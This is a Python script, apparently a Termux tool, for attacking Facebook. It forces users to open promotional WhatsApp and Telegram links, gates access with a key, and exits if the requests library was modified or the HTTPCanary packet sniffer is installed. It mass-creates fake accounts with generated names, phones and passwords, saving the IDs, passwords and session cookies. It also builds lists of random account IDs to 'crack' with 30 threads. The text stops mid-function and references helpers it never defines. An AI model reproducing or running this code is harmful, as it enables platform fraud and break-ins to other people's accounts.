import os
import re
import time
import uuid
import hashlib
import random
import string
import requests
import sys
import json
import urllib
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from os import system
from datetime import datetime

import os, sys
# Tumhara WhatsApp channel link
channel_link = "https://whatsapp.com/channel/0029VbEC2UpCMY0MGqKixB1S"

# Valid keys (channel par available hogi)
approved_keys = ["DON'T COMPARE YOURSELF WITH DANGER MARUF YOUR MAXIMUM ACHIEVEMENT IS DANGER MARUF'S MINIMUM LEVEL🥷💥☠️"] 

def first_step():
    os.system("clear")
    print("\033[1;35m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("\033[1;32m        🔒 𝐌𝐀𝐑𝐔𝐅  𝐒𝐂𝐑𝐈𝐏𝐓 𝐋𝐎𝐂𝐊𝐄𝐃 🔒")
    print("\033[1;35m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
    print("\033[1;32m 𝐉𝐎𝐈𝐍 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 𝐂𝐇𝐀𝐈𝐍𝐀𝐋 𝐂𝐎𝐍𝐓𝐄𝐂𝐓+8801905918710✅ \033[0m\n")
    print("\033[1;32m 𝐃𝐎𝐒𝐓𝐎 𝐊𝐄𝐘 𝐀𝐀𝐏𝐊𝐎 𝐂𝐇𝐀𝐈𝐍𝐀𝐋 𝐌𝐄 𝐌𝐈𝐋𝐄𝐆𝐀  ✅ \033[0m\n")
    print("\033[1;32m 𝐏𝐄𝐇𝐋𝐄 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 𝐆𝐑𝐎𝐔𝐏𝐒 𝐏𝐀𝐑 𝐉𝐎𝐈𝐍 𝐊𝐀𝐑𝐎.")
    os.system(f"xdg-open https://chat.whatsapp.com/BhPlds1pgjGLtAYge3OF2f?s=cl&p=a&mlu=4&ilr=4&iam=2")
    input("\n[↩] 𝐉𝐀𝐁 𝐉𝐎𝐈𝐍 𝐊𝐀𝐑 𝐋𝐄𝐍𝐀 𝐓𝐀𝐁 𝐄𝐍𝐓𝐄𝐑 𝐃𝐀𝐁𝐀𝐎...")

def check_key():
    user_key = input("\n[?] Enter your key: ")
    if user_key in approved_keys:
        print("\n[✓] Key approved! Script is running...\n")
    else:
        print("\n[×] Invalid key! Dobara Channel par jao.")
        sys.exit()

# Pehle channel open hoga
first_step()

# Phir key check hoga
check_key()

# Tool ka main code yahan likho
print(">>> Tool Successfully Unlocked <<<")



# Ensure required modules are installed
modules = ['requests', 'urllib3', 'mechanize', 'rich']
for module in modules:
    try:
        __import__(module)
    except ImportError:
        os.system(f'pip install {module}')

# Suppress InsecureRequestWarning
from requests.exceptions import ConnectionError
from requests import api, models, sessions
requests.urllib3.disable_warnings()


# Initial setup and promotion
os.system('clear')
print(' \x1b[38;5;46𝐦𝐌𝐀𝐑𝐔𝐅   𝐒𝐄𝐑𝐕𝐄𝐑 𝐋𝐎𝐀𝐃𝐈𝐍𝐆....')
os.system ('espeak -a 300 " WELLCOME TO maruf TOOL "')

os.system('pip uninstall -y requests chardet urllib3 idna certifi')
os.system('python -m pip install --upgrade chardet urllib3 idna certifi requests')
os.system('python -m pip install --upgrade httpx beautifulsoup4')
print('loading Modules ...\n')
os.system('clear')



os.system('xdg-open https://whatsapp.com/channel/0029VbEC2UpCMY0MGqKixB1S')

os.system('xdg-open https://t.me/denzarzoneprime')

os.system('xdg-open https://youtube.com/@ziyatechnical111?si=r4IMNh9dMJqp8pMg')

os.system('xdg-open https://chat.whatsapp.com/ItYcPdBMJoPAJWak5B6Q3L?s=sw&p=a&mlu=4&ilr=4')


# --- Anti-tampering and Security Checks ---
# The script checks if the source code of the 'requests' library has been modified
# or if packet sniffing tools are being used.
try:
    api_body = open(api.__file__, 'r').read()
    models_body = open(models.__file__, 'r').read()
    session_body = open(sessions.__file__, 'r').read()
    word_list = ['print', 'lambda', 'zlib.decompress']
    for word in word_list:
        if word in api_body or word in models_body or word in session_body:
            exit()
except:
    pass


class sec:
    """
    A security class to detect debugging and packet sniffing tools.
    """
    def __init__(self):
        self.__module__ = __name__
        self.__qualname__ = 'sec'
        # Paths to check for modifications
        paths = [
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/sessions.py',
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/api.py',
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/models.py'
        ]
        for path in paths:
            if 'print' in open(path, 'r').read():
                self.fuck()
        # Check for HTTPCanary (a packet sniffing app)
        if os.path.exists('/storage/emulated/0/x8zs/app_icon/com.guoshi.httpcanary.png'):
            self.fuck()
        if os.path.exists('/storage/emulated/0/Android/data/com.guoshi.httpcanary'):
            self.fuck()

    def fuck(self):
        """
        Terminates the script if tampering is detected.
        """
        print(' \x1b[1;32m Congratulations ! ')
        self.linex()
        exit()

    def linex(self):
        print('\x1b[38;5;48mâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”')


# Global variables
method = []
oks = []
cps = []
loop = 0
user = []

# Color codes for terminal output
X = '\x1b[1;37m'
rad = '\x1b[38;5;196m'
G = '\x1b[38;5;46m'
Y = '\x1b[38;5;220m'
PP = '\x1b[38;5;203m'
RR = '\x1b[38;5;196m'
GS = '\x1b[38;5;40m'
W = '\x1b[1;37m' 

# ==================== BANNER COLORS ====================
RESET  = '\033[0m'
BOLD   = '\033[1m'

RED    = '\033[38;5;196m'
ORANGE = '\033[38;5;208m'
YELLOW = '\033[38;5;226m'
GREEN  = '\033[38;5;46m'
CYAN   = '\033[38;5;51m'
BLUE   = '\033[38;5;39m'
PURPLE = '\033[38;5;129m'
PINK   = '\033[38;5;201m'
WHITE  = '\033[1;37m'
GRAY   = '\033[38;5;245m'
# Color aliases used by banner
R = RR
P = PP
C = GS
RESET = W

def windows():
    """
    Generates a random Windows User-Agent string.
    """
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2', '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2', '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}"
    D = "Mozilla/5.0 (Linux; Android 13; SM-G998B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/423.0.0.21.64;]"
    return "Mozilla/5.0 (Linux; Android 13; SM-G998B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/423.0.0.21.64;]"


def window1():
    """
    Generates another variant of a random Windows User-Agent string.
    """
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0', '1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{random.choice(['0', '1', '2'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{cz}"
    latest_build = rr(6000, 9000)
    latest_patch = rr(100, 200)
    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
    return random.choice([A, B, C, D])

def window1():
    """
    Generates another variant of a random Windows User-Agent string.
    """
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0', '1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{random.choice(['0', '1', '2'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{cz}"
    latest_build = rr(6000, 9000)
    latest_patch = rr(100, 200)
    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
    return random.choice([A, B, C, D])


# Set window title
sys.stdout.write('\x1b]2;𓆩【👑𝐌𝐀𝐑𝐔𝐅 👑 】𓆪 \x07')


    # MARUF Clover Logo - Green - Version 2.5
def ____banner____():
    if 'win' in sys.platform:
        os.system('cls')
    else:
        os.system('clear')
    
    print("""\033[1;32m
  
███╗   ███╗ █████╗ ██████╗ ██╗   ██╗███████╗
████╗ ████║██╔══██╗██╔══██╗██║   ██║██╔════╝
██╔████╔██║███████║██████╔╝██║   ██║█████╗  
██║╚██╔╝██║██╔══██║██╔══██╗██║   ██║██╔══╝  
██║ ╚═╝ ██║██║  ██║██║  ██║╚██████╔╝██║     
╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝
\033[1;35m[+]𝐏𝐄𝐇𝐂𝐇𝐀𝐍 𝐓𝐎 𝐒𝐀𝐁 𝐒𝐄 𝐇𝐀𝐈 𝐏𝐀𝐑 𝐁𝐇𝐀𝐑𝐎𝐒𝐇𝐀 𝐊𝐇𝐔𝐃𝐏𝐄 𝐇𝐄")   
 \033[1;32m----------------------------------------------                           
 \033[1;32m[+] 𝐎𝐖𝐍𝐄𝐑 :       𝐃𝐀𝐍𝐆𝐄𝐑🥷𝐌𝐀𝐑𝐔𝐅          💞🅛︎🅞︎ⓥⓔ💞
 \033[1;33m[+] 𝐖𝐓𝐒𝐀𝐏 :       +8801905918710       🥷.(¯`v´¯)♥
 \033[1;33m[+]𝐃𝐀𝐍𝐆𝐄𝐑 :       𝐙𝐎𝐈𝐍𝐄 𝐏𝐑𝐈𝐌𝐄         🥷….•.¸.•´💞
 \033[1;33m[+] 𝐓𝐎𝐎𝐋𝐒 :        𝐅𝐁💞𝐎𝐋𝐃🥵𝐂𝐋𝐎𝐍𝐈𝐂   🫨….¸.•´💞
  \033[1;32m----------------------------------------------
\033[1;35m[+]𝐂𝐇𝐀𝐇𝐑𝐄 𝐇𝐀𝐒𝐈𝐏𝐄 𝐌𝐀𝐓𝐉𝐀𝐍𝐀 𝐃𝐈𝐋 𝐊𝐀𝐁𝐑𝐔𝐒𝐓𝐀𝐍 𝐁𝐀𝐍𝐀𝐘𝐄 𝐇𝐔𝐎𝐍 """)

#-----------------------( LOOP )-----------------------#
loop=0
tl=0
ok_count=0
cp_count=0
dones=[]
oks=[]
cps=[]
nov=[]
kitty=[]
nvs=[]
twf=[]
gen=[]
plist=[]
__COOKIE__=[]
__CP__=[]
__LOCK__=[]
#-----------------------( API BYPASS )-----------------------#
def http_canary():
    try:
        if os.path.exists(os.path.join(path_canary,package_name)):
            system("clear" if os.name == "posix" else "cls")
            print(f"{xpxx} FIRST UNINSTALL HTTPCANARY APK FOR RUN TOOLS")
            exit('\n')
        if os.path.exists(os.path.join(path_canary2,package_name2)):
            system("clear" if os.name == "posix" else "cls")
            print(f"{xpxx} FIRST UNINSTALL HTTPCANARY APK FOR RUN TOOLS")
            exit('\n')
        elif os.path.exists(os.path.join(path_canary3,package_name3)):
            system("clear" if os.name == "posix" else "cls")
            print(f"{xpxx} FIRST UNINSTALL HTTPCANARY APK FOR RUN TOOLS")
            exit('\n')
        elif os.path.exists(os.path.join(path_canary4,package_name4)):
            system("clear" if os.name == "posix" else "cls")
            print(f"{xpxx} FIRST UNINSTALL HTTPCANARY APK FOR RUN TOOLS")
            exit('\n')
        elif os.path.exists(os.path.join(path_canary5,package_name5)):
            system("clear" if os.name == "posix" else "cls")
            print(f"{xpxx} FIRST UNINSTALL HTTPCANARY APK FOR RUN TOOLS")
            exit('\n')
        elif os.path.exists(os.path.join(path_canary6,package_name6)):
            system("clear" if os.name == "posix" else "cls")
            print(f"{xpxx} FIRST UNINSTALL HTTPCANARY APK FOR RUN TOOLS")
            exit('\n')
        else:
            pass
    except:
        system("clear" if os.name == "posix" else "cls")
        print(f"{xp} TURN ON STORAGE PERMISSION")
        exit('\n')
#-----------------------( MAIN/MENU )-----------------------#
def __MENU__():
    __ERRORLOGO__()
    print(f"{xp1} AUTO CREATE FB ")
    print(f"{xp2} 2FA ")
    print(f"{xp3} COOKIE EXTRACT ")
    print(f"{xp0} EXIT TOOLS ")
    __LINE__()
    __MENUC__=input(f"{xpx} INPUT MENU {xpxxx} ")
    if __MENUC__=="1":
       __AUTOX__()
    elif __MENUC__=="2":__2FAX__()
    elif __MENUC__=="3":__COKIX__()
    elif __MENUC__=="0":__LINE__();print(f"{xp} EXIT SUCCESSFULLY ");time.sleep(1.1);__LINE__();os.system(f"exit")
    else:__LINE__();print(f"{xpxx} INVALID OPTION TRY AGAIN ");time.sleep(1);__MENU__()
#-----------------------( MAIN/MENU )-----------------------#
def __MENU__():      
    print(f"{xp1} AUTO CREATE FB ")
    print(f"{xp2} 2FA ")
    print(f"{xp3} COOKIE EXTRACT ")
    print(f"{xp0} EXIT TOOLS ")
    __LINE__()
    __MENUC__=input(f"{xpx} INPUT MENU {xpxxx} ")
    if __MENUC__=="1":
       __AUTOX__()
    elif __MENUC__=="2":__2FAX__()
    elif __MENUC__=="3":__COKIX__()
    elif __MENUC__=="0":__LINE__();print(f"{xp} EXIT SUCCESSFULLY ");time.sleep(1.1);__LINE__();os.system(f"exit")
    else:__LINE__();print(f"{xpxx} INVALID OPTION TRY AGAIN ");time.sleep(1);__MENU__()
#-----------------------( AUTO-MENU )-----------------------#
def __AUTOX__():
    __ERRORLOGO__()
    __NUM__=input(f"{xp} HOW MANY FACEBOOK ACCOUNT LIMIT {xpxxx}︎ ")
    __ERRORLOGO__()
    print(f"{xp1} GIRL NAME PHILIPPINES ")
    print(f"{xp2} BOY NAME PHILIPPINES ")
    print(f"{xp3} GIRL NAME NEPAL ")
    print(f"{xp4} BOY NAME NEPAL ")
    print(f"{xp5} GIRL NAME PAKISTAN ")
    print(f"{xp6} BOY NAME PAKISTAN ")
    __LINE__()
    __NAME__=input(f"{xpx} INPUT NAME {xpxxx} ")
    __ERRORLOGO__()
    print(f"{xp1} FEMALE ")
    print(f"{xp2} MALE ")
    __LINE__()
    __GENDER__=input(f"{xpx} INPUT GENDER {xpxxx} ")
    __ERRORLOGO__()
    print(f"{xp1} AUTO PASSWORD ")
    print(f"{xp2} AUTO PASSWORD WITH NAMENUMBER ")
    print(f"{xp3} AUTO PASSWORD WITH SURNAME ")
    print(f"{xp4} MANUAL CUSTOM PASSWORD ")
    __LINE__()
    __PASS__=input(f"{xpx} INPUT PASSWORD {xpxxx} ")
    if __PASS__=="4":pww=input(f"{xpx} ETHER CUSTOMER PASSWORD {xpxxx} ")
    __ERRORLOGO__()
    print(f"{xp} SHOW ALL DETAILS...? ")
    __LINE__()
    show_details=input(f"{xpx} {white}[{green}Y{white}/{red}N{white}] {xpxxx} ")
    __ERRORLOGO__()
    print(f"{xp} TOTAL NEW ACCOUNT IDS {xpxxx} {__NUM__}")
    print(f"{xp} CREATING ACCOUNT STARTED")
    print(f"{xp} USER 1.1.1 VPN")
    __LINE__()
    for _ in range(int(__NUM__)):
        try:
            global oks,cps
            color=random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
            sys.stdout.write(f'\r {white}[{green}KITTY-CREATE{white}]-{white}[{green}OK:-%s{white}] '%(len(oks)));sys.stdout.flush()
            sys.stdout.flush()
            ses=requests.Session()
            response=ses.get("https://x.facebook.com/reg")
            form=extractor(response.text)
            if __NAME__=="1":firstname,lastname=get_girl_name_ph()
            elif __NAME__=="2":firstname,lastname=get_boy_name_ph()
            elif __NAME__=="3":firstname,lastname=get_girl_name_nepal()
            elif __NAME__=="4":firstname,lastname=get_boy_name_nepal()
            elif __NAME__=="5":firstname,lastname=get_girl_name_pakistan()
            elif __NAME__=="6":firstname,lastname=get_boy_name_pakistan()
            if __GENDER__=="1":sex,gender="1","Female"
            elif __GENDER__=="2":sex,gender="2","Male"
            if __PASS__=="1":pww=get_pass()
            if __PASS__=="2":pww=f"{firstname.lower()}{random.choice([123,12345,123456,1234567,123456789,1234567890,143,143143,123123])}"
            if __PASS__=="3":pww=f"{firstname.lower()}{lastname.lower()}"
            phone=generate_phone_number()
            payload={'ccp': "2",
            'reg_instance': form.get("reg_instance",""),
            'submission_request': "true",
            'reg_impression_id': form.get("reg_impression_id",""),
            'ns': "1",
            'logger_id': form.get("logger_id",""),
            'firstname': firstname,
            'lastname': lastname,
            'birthday_day': str(random.randint(15,25)),
            'birthday_month': str(random.randint(5,10)),
            'birthday_year': str(random.randint(1985,1995)),
            'reg_email__': phone,
            'sex': sex,
            'encpass': f'#PWD_BROWSER:0:{int(time.time())}:{pww}',
            'submit': "Sign Up",
            'fb_dtsg': form.get("fb_dtsg",""),
            'jazoest': form.get("jazoest",""),
            'lsd': form.get("lsd","")}
            headers={"Host": "m.facebook.com",
            "Connection": "keep-alive",
            "User-Agent": ___EthanAutoUa2___(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9"}
            head1={'accept-encoding': 'gzip, deflate',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'referer': 'https://mbasic.facebook.com/reg/',
            'sec-ch-ua': '',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': 'Android',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': ___EthanAutoUa2___()}
            merged_headers={**headers,**head1}
            reg_url="https://www.facebook.com/reg/submit/"
            reg_submit=ses.post(reg_url,data=payload,headers=merged_headers,proxies=ethanproxy())
            login_coki=ses.cookies.get_dict()
            if "c_user" in login_coki:
                coki="sb=Cracked.By-Error_Tool;"+";".join([f"{key}={value}" for key,value in login_coki.items()])
                uid=login_coki["c_user"]
                if show_details=='y':
                    print(f"\r{xp} NAME     {xpxxx} {firstname} {lastname}\033[1;37m")
                    print(f"\r{xp} NUMBER   {xpxxx} {phone}\033[1;37m")
                    print(f"\r{xp} GENDER   {xpxxx} {gender}\033[1;37m")
                    print(f"\r{xp} BIRTHDAY {xpxxx} {payload['birthday_day']}-{payload['birthday_month']}-{payload['birthday_year']}\033[1;37m")
                    print(f"\r{xp} UID      {xpxxx} {uid}\033[1;37m")
                    print(f"\r{xp} PASS     {xpxxx} {pww}\033[1;37m")
                    print(f"\r{xp} COOKIE   {xpxxx} {coki}\033[1;37m")
                    __LINE__()
                else:
                    print(f'\r{green} [KALYAN-OK] '+uid+' | '+pww+'\033[1;97m')
                open('/sdcard/KALYAN-AUTO/AUTO/KALYAN-AUTO-OK.txt', 'a').write(uid+'|'+pww+'|'+coki+'\n')
                oks.append(uid)
            elif "checkpoint" in login_coki:
                uid=login_coki.get("c_user","unknown")
                cps.append(uid)
            time.sleep(1)
        except Exception as e:pass
    print("\033[1;37m")
    __LINE__()
    print(f"{xp} THE PROCESS HAS COMPLETED...!")
    __LINE__()
    print(f"{xp} {green}TOTAL OK {xpxxx} {len(oks)}")
    print(f"{xp} {red}TOTAL CP {xpxxx} {len(cps)}")
    print(f"{xp} {blue}TOTAL 2F {xpxxx} {len(twf)}")
    __LINE__()
    print(f"{xp} THANKS FOR USING.....! ")
    __LINE__()
    exit()
#-----------------------( 2FA-MENU )-----------------------#
def __2FAX__():
    print(f"{xp} COMING SOON")
    exit()
#-----------------------( COKI-MENU )-----------------------#
def __COKIX__():
    print(f"{xp} COMING SOON")
    exit()

def creationyear(uid):
    """
    Estimates the Facebook account creation year based on the UID.
    """
    if len(uid) == 15:
        if uid.startswith('1000000000'):
            return '2009'
        if uid.startswith('100000000'):
            return '2009'
        if uid.startswith('10000000'):
            return '2009'
        if uid.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')):
            return '2009'
        if uid.startswith(('1000006', '1000007', '1000008', '1000009')):
            return '2010'
        if uid.startswith('100001'):
            return '2010'
        if uid.startswith(('100002', '100003')):
            return '2011'
        if uid.startswith('100004'):
            return '2012'
        if uid.startswith(('100005', '100006')):
            return '2013'
        if uid.startswith(('100007', '100008')):
            return '2014'
        if uid.startswith('100009'):
            return '2015'
        if uid.startswith('10001'):
            return '2016'
        if uid.startswith('10002'):
            return '2017'
        if uid.startswith('10003'):
            return '2018'
        if uid.startswith('10004'):
            return '2019'
        if uid.startswith('10005'):
            return '2020'
        if uid.startswith('10006'):
            return '2021'
        if uid.startswith('10009'):
            return '2023'
        if uid.startswith(('10007', '10008')):
            return '2022'
        return ''
    elif len(uid) in (9, 10):
        return '2008'
    elif len(uid) == 8:
        return '2007'
    elif len(uid) == 7:
        return '2006'
    elif len(uid) == 14 and uid.startswith('61'):
        return '2024'
    else:
        return ''


def clear():
    os.system('clear')


def linex():
    print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')


def BNG_71_():
    """
    Main menu function.
    """
    ____banner____()
    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mOLD ACCOUNT TOOL')
    linex()
    __Jihad__ = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;41mCHOICE  {W}: {Y}")
    if __Jihad__ in ('A', 'a', '01', '1'):
        old_clone()
    else:
        print(f"\n    {rad}Choose Valid Option... ")
        time.sleep(2)
        BNG_71_()


def old_clone():
    """
    Menu for selecting old account cloning type.
    """
    ____banner____()
    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;49mALL SERIES')
    linex()
    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;49m100003/4 SERIES')
    linex()
    print('       \x1b[38;5;196m(\x1b[1;37mC\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;49m2009 series')
    linex()
    _input = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;41mCHOICE  {W}: {Y}")
    if _input in ('A', 'a', '01', '1'):
        old_One()
    elif _input in ('B', 'b', '02', '2'):
        old_Tow()
    elif _input in ('C', 'c', '03', '3'):
        old_Tree()
    else:
        print(f"\n[×]{rad} Choose Value Option... ")
        BNG_71_()


def old_One():
    """
    Cloning method for accounts from 2010-2014.
    """
    user = []
    ____banner____()
    print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;49mOld Code {Y}:{G} 2010-2014")
    ask = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;41mSELECT {Y}:{G} ")
    linex()
    ____banner____()
    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
    limit = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mSELECT {Y}:{G} ")
    linex()
    star = '10000'
    for _ in range(int(limit)):
        data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
        user.append(data)
    print('        \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD 1')
    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD 2')
    linex()
    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
        linex()
        for mal in user:
            uid = star + mal
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(f"    {rad}[!] INVALID METHOD SELECTED")
                break


def old_Tow():
    """
    Cloning method for accounts with specific prefixes.
    """
    user = []
    ____banner____()
    print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mOLD CODE {Y}:{G} 2010-2014")
    ask = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mSELECT {Y}:{G} ")
    linex()
    ____banner____()
    print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
    limit = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mSELECT {Y}:{G} ")
    linex()
    prefixes = ['100003', '100004']
    for _ in range(int(limit)):
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices('0123456789', k=9))
        uid = prefix + suffix
        user.append(uid)
    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMETHOD A')
    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMETHOD B')
    linex()
    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
        linex()
        for uid in user:
